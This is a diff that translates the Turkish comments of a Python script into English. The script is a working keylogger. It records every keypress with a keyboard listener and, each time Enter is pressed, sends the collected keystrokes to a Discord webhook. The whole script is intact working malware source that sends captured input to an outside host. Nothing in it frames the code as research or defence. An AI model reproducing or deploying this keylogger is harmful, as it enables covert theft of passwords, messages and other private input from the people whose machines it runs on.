@@ -3,11 +3,11 @@ import requests
 import json
 import sys
 
-# Webhook URL'sini buraya girin
+# Enter your webhook URL here
 webhook_url = 'your_webhook_url'
 
 def send_to_discord(message):
-    # Mesajı webhook URL'sine gönder
+    # Send the message to the webhook URL
     data = {
         'content': message
     }
@@ -16,21 +16,21 @@ def send_to_discord(message):
     }
     response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
     if response.status_code != 204:
-        print('Webhook gönderme hatası:', response.text)
+        print('Webhook sending error:', response.text)
 
-# Klavye girişlerini toplamak için liste oluştur
+# Create a list to store keystrokes
 keystrokes_list = []
 
-# Klavye girişlerini yakalamak için bir fonksiyon tanımla
+# Define a function to capture keyboard strokes
 def print_keystroke(key):
-    # Basılan tuşun karakterini al
+    # Get the character of the pressed key
     key_char = None
     try:
         key_char = key.char
     except AttributeError:
         pass
 
-    # Tuşun karakteri varsa veya tuş enter değilse listeye ekle
+    # If the key has a character or is not the Enter key, add it to the list
     if key_char:
         key_text = key_char
     else:
@@ -38,18 +38,18 @@ def print_keystroke(key):
 
     keystrokes_list.append(key_text)
 
-    # Enter tuşuna basıldığında listeyi birleştir ve Discord'a gönder
+    # If the Enter key is pressed, join the list and send it to Discord
     if key == keyboard.Key.enter:
         send_to_discord(' '.join(keystrokes_list))
         keystrokes_list.clear()
-    # q tuşuna basıldığında programı sonlandır
+    # If the 'q' key is pressed, stop the program
     elif key_char == 'q':
         keyboard_listener.stop()
         sys.exit()
 
-# Event handler'ı başlat
+# Start the event handler
 keyboard_listener = keyboard.Listener(on_press=print_keystroke)
 keyboard_listener.start()
 
-# Programın çalışmasını bekleyin
+# Wait for the program to run
 keyboard_listener.join()
